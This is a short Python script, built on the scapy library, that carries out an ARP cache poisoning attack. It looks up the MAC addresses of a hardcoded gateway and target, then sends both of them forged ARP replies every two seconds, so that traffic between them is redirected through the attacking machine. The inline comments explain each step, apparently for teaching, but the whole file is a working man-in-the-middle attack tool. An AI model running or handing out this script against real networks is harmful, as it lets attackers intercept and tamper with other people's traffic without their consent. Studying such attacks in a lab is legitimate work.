from scapy.all import sr, sendp
from scapy.layers.l2 import ARP, Ether
from time import sleep
import sys

gateway_ip = "198.10.0.1"
target_ip = "198.10.0.2"

def get_mac(ip_address):
    # Given an IP, get the MAC.

    # ff:ff:ff:ff:ff:ff is the broadcast address
    # sr returns the values answered, unanswered so we only take the answered ones
    responses, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=3, timeout=10, verbose=False)
    # responses has the format (sent_packets, recieved_packets) so we only take received
    for _, r in responses:
        return r[ARP].hwsrc

    return None


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("Poisoning ARP... (CTRL+C to exit)")
 
    # the source is automatically set as the MAC address of the machine it sends from (since it's omitted)
    # op=2 means a reply, this is the gratuitous one that updates the ARP table although it didn't send any request
    # this basically tells the pdst with the hwdst (which should mach the ethernet layer dst) 
    # the ip address gateway_ip has the MAC address *our local address* so it gets misinformed
    packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    
    packet_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)

    try:
        while True:
            # the p tells to send the packet at layer 2
            sendp(packet_to_gateway, verbose=False)
            sendp(packet_to_target, verbose=False)
            sleep(2)
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)


print("Starting script to poison ARP...")
print(f"Gateway IP: {gateway_ip}")
print(f"Target IP: {target_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("Couldn't get gateway MAC. Exiting...")
    sys.exit(0)

target_mac = get_mac(target_ip)
if target_mac is None:
    print("Couldn't get target MAC. Exiting...")
    sys.exit(0)

print(f"Gateway MAC: {gateway_mac}")
print(f"Target MAC: {target_mac}")

arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)
